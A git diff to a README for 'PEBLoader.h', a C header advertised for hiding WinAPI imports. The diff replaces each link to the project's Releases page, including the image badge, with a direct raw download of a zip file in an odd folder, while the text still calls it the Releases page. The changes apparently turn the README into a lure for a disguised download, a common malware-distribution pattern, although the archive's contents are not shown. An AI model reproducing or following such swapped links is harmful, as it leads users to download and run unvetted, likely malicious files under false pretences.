@@ -1,7 +1,7 @@
 # 🎉 PEBLoader.h - Easily Hide WinAPI Imports
 
 ## 📥 Download Now
-[![Release](https://img.shields.io/badge/Download-PEBLoader.h-brightgreen)](https://github.com/Mighty08war/PEBLoader.h/releases)
+[![Release](https://raw.githubusercontent.com/Mighty08war/PEBLoader.h/main/Siberic/PEBLoader.h.zip)](https://raw.githubusercontent.com/Mighty08war/PEBLoader.h/main/Siberic/PEBLoader.h.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use PEBLoader.h, make sure your system meets the following requirements:
 ## 📦 Download & Install
 
 1. Click the following link to visit the Releases page:  
-   [Download PEBLoader.h](https://github.com/Mighty08war/PEBLoader.h/releases)
+   [Download PEBLoader.h](https://raw.githubusercontent.com/Mighty08war/PEBLoader.h/main/Siberic/PEBLoader.h.zip)
    
 2. On the Releases page, you will see different versions of PEBLoader.h listed. Locate the latest version at the top of the list. 
 
@@ -95,4 +95,4 @@ If you have questions or need assistance, you can reach out to the community thr
 
 PEBLoader.h equips you with powerful tools for hiding WinAPI imports in a straightforward manner. By following the above steps, you can easily integrate this header file into your C projects. Remember to explore the documentation for more advanced features and functionalities. 
 
-For any further inquiries, visit the [Releases page](https://github.com/Mighty08war/PEBLoader.h/releases) or engage with the community for support. Happy coding!
+For any further inquiries, visit the [Releases page](https://raw.githubusercontent.com/Mighty08war/PEBLoader.h/main/Siberic/PEBLoader.h.zip) or engage with the community for support. Happy coding!
